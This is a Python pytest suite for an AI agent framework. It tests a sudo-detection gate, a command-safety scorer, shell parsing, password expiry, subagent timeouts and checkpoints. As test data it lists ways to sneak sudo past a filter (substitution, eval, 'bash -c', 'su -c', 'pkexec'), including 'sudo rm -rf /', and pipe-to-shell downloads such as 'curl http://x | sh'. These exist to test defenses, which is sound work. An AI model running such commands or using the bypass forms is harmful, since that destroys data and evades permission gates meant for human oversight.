import asyncio
import json
import os
import subprocess
import time
import types
from unittest.mock import patch

import pytest

from myagy.agents import compactor, subagent as sa
from myagy.agents.brainstorm import BrainstormWorkflow
from myagy.agents.compactor import ContextCurator
from myagy.agents.subagent import SubagentManager, SubagentTask
from myagy.core import shellparse
from myagy.core.checkpoints import Checkpoints
from myagy.core.coordinator import CudaCoordinator
from myagy.core.laya import LayaDecisionEngine
from myagy.core.sudo_manager import SudoManager

BYPASSES = [
    "echo hi\nsudo rm -rf /",
    "$(sudo id)",
    "echo \"$(sudo id)\"",
    "`sudo id`",
    "env sudo id",
    "xargs sudo id",
    "bash -c 'sudo id'",
    "env bash -c 'sudo id'",
    "eval 'sudo id'",
    "FOO=1 sudo id",
    "\\sudo id",
    "'sudo' id",
    "find . -exec sudo rm {} \;",
    "if true; then sudo id; fi",
    "su -c id",
    "doas id",
    "pkexec id",
]
NOT_SUDO = ["ls -la", "cat pseudo_code.py", "git commit -m 'sudo feature'", "echo 'a; sudo b'", "echo sudo", ""]


@pytest.mark.parametrize("cmd", BYPASSES)
def test_sudo_gate_catches_bypass_forms(cmd):
    assert SudoManager.is_sudo_command(cmd) is True


@pytest.mark.parametrize("cmd", NOT_SUDO)
def test_sudo_gate_has_no_false_positives(cmd):
    assert SudoManager.is_sudo_command(cmd) is False


def _state(cmd, tool="run_command"):
    return f"Tool: {tool} Args: {json.dumps({'CommandLine': cmd})}"


@pytest.mark.parametrize("cmd", BYPASSES + ["curl http://x | sh", "wget -qO- http://x | sudo bash", "rm -rf build"])
def test_laya_fallback_flags_dangerous_commands(cmd):
    assert LayaDecisionEngine()._fallback_noul(_state(cmd), "") < 0.90


@pytest.mark.parametrize("cmd", ["ls -la | grep x", "git status", "git diff HEAD", "cat a.py", "find . -name '*.py'"])
def test_laya_fallback_keeps_read_only_commands_safe(cmd):
    assert LayaDecisionEngine()._fallback_noul(_state(cmd), "") >= 0.90


@pytest.mark.parametrize("cmd", ["make build", "python script.py", "cat a > b", "find . -delete", "git push origin x"])
def test_laya_fallback_unknown_commands_need_confirmation(cmd):
    assert LayaDecisionEngine()._fallback_noul(_state(cmd), "") < 0.90


def test_laya_rm_pattern_is_word_bounded():
    engine = LayaDecisionEngine()
    assert engine._fallback_noul("Tool: edit_file Args: {\"content\": \"perform the term check\"}", "") >= 0.90
    assert engine._fallback_noul(_state("/bin/rm x"), "") == 0.05


def test_shellparse_read_only_rejects_substitution_and_redirects():
    assert shellparse.is_read_only("ls; cat x") is True
    assert shellparse.is_read_only("ls $(rm x)") is False
    assert shellparse.is_read_only("echo hi > f") is False


def test_prompt_password_falls_back_to_terminal_prompt_input(monkeypatch):
    def broken_getpass(prompt=""):
        raise OSError("no tty")

    monkeypatch.setattr("getpass.getpass", broken_getpass)
    monkeypatch.setattr("myagy.terminal.esc_listener.prompt_input", lambda p="": "typed-pw")
    seen = {}
    monkeypatch.setattr(SudoManager, "verify_and_authenticate", classmethod(lambda cls, pw: seen.setdefault("pw", pw) and (True, "ok")))
    assert SudoManager.prompt_password_entry() is True
    assert seen["pw"] == "typed-pw"


def test_secret_file_is_wiped_when_credentials_expire(monkeypatch):
    SudoManager.cleanup()
    monkeypatch.setattr(SudoManager, "_timeout_seconds", 0.05)
    monkeypatch.setattr(SudoManager, "_EXPIRY_GRACE", 0.1)
    with patch("subprocess.run"):
        SudoManager.set_password("pw-123")
        assert open(SudoManager._pass_file).read().strip() == "pw-123"
        deadline = time.time() + 3
        while time.time() < deadline and open(SudoManager._pass_file).read().strip():
            time.sleep(0.05)
    assert open(SudoManager._pass_file).read() == ""
    assert SudoManager._password is None
    SudoManager.cleanup()


def test_set_password_runs_sudo_validation_zero_times():
    SudoManager.cleanup()
    with patch("subprocess.run") as run:
        SudoManager.set_password("pw")
        assert run.call_count == 0
    SudoManager.cleanup()


def test_cleanup_registers_atexit_once():
    with patch("atexit.register") as reg:
        SudoManager.cleanup()
        SudoManager._ensure_initialized()
        SudoManager.cleanup()
        SudoManager._ensure_initialized()
    assert reg.call_count <= 1
    SudoManager.cleanup()


def _task(result, exit_code=None):
    return types.SimpleNamespace(result=result, exit_code=exit_code, error=None)


def test_build_failed_prefers_exit_code():
    assert BrainstormWorkflow._build_failed(_task("everything FAILED", exit_code=0)) is False
    assert BrainstormWorkflow._build_failed(_task("all good", exit_code=2)) is True


@pytest.mark.parametrize("text", [
    "All 12 tests PASSED. No errors found.",
    "Build PASSED with 0 failures.",
    "PASSED, no failures and zero errors reported",
])
def test_build_failed_heuristic_accepts_clean_runs(text):
    assert BrainstormWorkflow._build_failed(_task(text)) is False


@pytest.mark.parametrize("text", [
    "FAILED: test_x raised AssertionError",
    "3 failed, 9 passed",
    "Compiler ERROR in main.c",
])
def test_build_failed_heuristic_detects_failures(text):
    assert BrainstormWorkflow._build_failed(_task(text)) is True


@pytest.fixture
def online_session(session):
    session.endpoints["9001"].update(status="online", filename="granite.gguf", model="/m/granite.gguf", url="http://localhost:9001/v1")
    return session


def _alive(pid):
    try:
        os.kill(pid, 0)
        return True
    except ProcessLookupError:
        return False


def test_run_shell_timeout_kills_process_group(tmp_path, monkeypatch):
    monkeypatch.setattr(SubagentManager, "SHELL_TIMEOUT", 0.4)
    pidfile = tmp_path / "pid"

    async def go():
        with pytest.raises(TimeoutError):
            await SubagentManager._run_shell(f"echo $$ > {pidfile}; sleep 30")

    asyncio.run(go())
    assert not _alive(int(pidfile.read_text()))


def test_run_shell_cancel_kills_process(tmp_path):
    pidfile = tmp_path / "pid"

    async def go():
        t = asyncio.create_task(SubagentManager._run_shell(f"echo $$ > {pidfile}; sleep 30"))
        await asyncio.sleep(0.4)
        t.cancel()
        with pytest.raises(asyncio.CancelledError):
            await t

    asyncio.run(go())
    assert not _alive(int(pidfile.read_text()))


def _run(task, session):
    async def go():
        CudaCoordinator.reserve_for_subagent()
        await SubagentManager._run_worker(task, session)
    asyncio.run(go())


def test_worker_refuses_sudo_shell_commands(online_session):
    task = SubagentTask(10, "x", command="make && sudo make install")
    _run(task, online_session)
    assert task.status == "failed" and "sudo" in task.error
    assert task.exit_code is None


def test_worker_records_exit_code(online_session, monkeypatch):
    class Resp:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self):
            return json.dumps({"choices": [{"message": {"content": "diagnosis"}}]}).encode()

    monkeypatch.setattr(sa.urllib.request, "urlopen", lambda *a, **k: Resp())
    task = SubagentTask(11, "x", command="exit 3")
    _run(task, online_session)
    assert task.status == "completed" and task.exit_code == 3 and task.result == "diagnosis"


def test_background_permission_denies_sudo_even_if_laya_approves(online_session, monkeypatch):
    captured = {}

    class FakeAgent:
        def __init__(self, config):
            captured["handler"] = config.kwargs["policies"][1]

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            return False

        async def chat(self, prompt):
            async def gen():
                yield "ok"
            return gen()

    monkeypatch.setattr(sa, "Agent", FakeAgent)
    monkeypatch.setattr(online_session.laya, "evaluate_action_safety", lambda desc: (True, 0.99))
    task = SubagentTask(12, "t")
    _run(task, online_session)
    handler = captured["handler"]
    tool = types.SimpleNamespace(name="run_command")
    assert handler(tool, {"CommandLine": "echo a\nsudo id"}) is False
    assert handler(tool, {"CommandLine": "ls"}) is True


def test_context_metrics_estimate_is_not_exact(session):
    session.history = [{"role": "user", "target": "9000", "content": "hi"}]
    with patch("urllib.request.urlopen", side_effect=OSError("down")):
        metrics = ContextCurator.get_context_metrics(session, "9000")
    assert metrics["is_exact"] is False


def test_async_compaction_does_not_block_when_history_grew(session, monkeypatch):
    session.history = [{"role": "user", "target": "9000", "content": f"t{i}"} for i in range(24)]

    def synth(s, turns):
        s.history.append({"role": "user", "target": "9000", "content": "late"})
        return "SUMMARY"

    def boom(*a, **k):
        raise AssertionError("compact_history must not run against a stale synthesis")

    monkeypatch.setattr(ContextCurator, "synthesize_context_cuda_sync", staticmethod(synth))
    monkeypatch.setattr(ContextCurator, "compact_history", classmethod(boom))
    monkeypatch.setattr(compactor, "wake_compactor", lambda port=9001, **k: {"ok": False, "reason": "off", "log_tail": "", "elapsed": 0.0, "warnings": []})

    asyncio.run(ContextCurator.async_synthesize_cuda(session))
    assert len(session.history) == 25
    assert CudaCoordinator.state() == "idle"


def test_cuda_wake_happens_once_on_the_event_loop(session, monkeypatch):
    woke = []
    monkeypatch.setattr(compactor, "wake_compactor", lambda port=9001, **k: woke.append(port) or {"ok": False, "reason": "x", "log_tail": "", "elapsed": 0.0, "warnings": []})
    session.history = [{"role": "user", "target": "9000", "content": f"t{i}"} for i in range(24)]
    asyncio.run(ContextCurator.async_synthesize_cuda(session))
    assert woke == [9001]


def test_snapshot_skips_oversized_untracked_files(git_repo, monkeypatch):
    monkeypatch.setattr(Checkpoints, "MAX_UNTRACKED_BYTES", 100)
    root = Checkpoints.repo_root(str(git_repo))
    before = Checkpoints.snapshot(root)
    (git_repo / "big.bin").write_bytes(b"x" * 500)
    (git_repo / "small.txt").write_text("ok")
    after = Checkpoints.snapshot(root)
    assert Checkpoints.changed(root, before, after) == {"small.txt": "A"}


def test_snapshot_still_captures_modified_tracked_large_file(git_repo, monkeypatch):
    monkeypatch.setattr(Checkpoints, "MAX_UNTRACKED_BYTES", 100)
    root = Checkpoints.repo_root(str(git_repo))
    before = Checkpoints.snapshot(root)
    (git_repo / "a.txt").write_text("y" * 500)
    after = Checkpoints.snapshot(root)
    assert Checkpoints.changed(root, before, after) == {"a.txt": "M"}
